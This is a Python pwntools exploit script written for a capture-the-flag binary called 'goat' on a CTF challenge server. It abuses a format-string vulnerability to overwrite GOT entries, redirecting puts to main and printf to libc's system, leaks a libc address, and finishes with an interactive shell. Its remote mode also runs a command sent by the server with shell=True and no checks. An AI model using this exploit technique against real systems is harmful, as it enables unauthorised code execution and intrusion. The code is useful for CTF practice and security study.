#!/usr/bin/env python3
from pwn import *
import subprocess

# =========================================================
#                          SETUP
# =========================================================
exe = './goat'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'goat.chal.cyberjousting.com', 1349

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'debug'
        p = remote(host, port, ssl=False)
        time.sleep(1)
        p.recvline()
        cmd = p.recvline().strip().decode()
        POC = subprocess.check_output(cmd, shell=True, text=True).strip()
        p.sendline(POC)
        time.sleep(1)
        return p
    elif args.DOCKER:
        p = remote("localhost", 5000)

        time.sleep(1)
        p.recvline()
        cmd = p.recvline().strip().decode()
        POC = subprocess.check_output(cmd, shell=True, text=True).strip()
        p.sendline(POC)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='goat')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    # Are you sure? You said: (length: 0x18)
    with log.progress("Overwrite GOT puts 2 byte -> main"), context.silent:
        payload = (f"%{u16(p64(elf.sym["main"])[:2]) - 0x18}c%10$hn".encode()).ljust(16, b"\x00") + p64(elf.got["puts"])
        io.sendlineafter(b"What's your name? ", payload)
        io.sendline(b"/bin/sh\x00")
    with log.progress("Leak printf via GOT"), context.silent:
        payload = (f"%9$s".encode()).ljust(8, b"\x00") + p64(elf.got["printf"])
        io.sendlineafter(b"What's your name? ", payload)
        io.recvline()
        printf = u64(io.recvline().strip().ljust(8, b"\x00"))
        libc.address = printf - libc.sym["printf"]
        io.sendline(b"/bin/sh\x00")
    log.info(f"printf: %#x", printf)
    log.info(f"Libc base: %#x", libc.address)
    with log.progress("Overwrite GOT printf 2 byte -> system"), context.silent:
        payload = (f"%{u16(p64(libc.sym["system"])[:2]) - 0x18}c%10$hn".encode()).ljust(16, b"\x00") + p64(elf.got["printf"])
        io.sendlineafter(b"What's your name? ", payload)
        io.sendline(b"/bin/sh\x00")
    io.interactive()

if __name__ == '__main__':
    exploit()
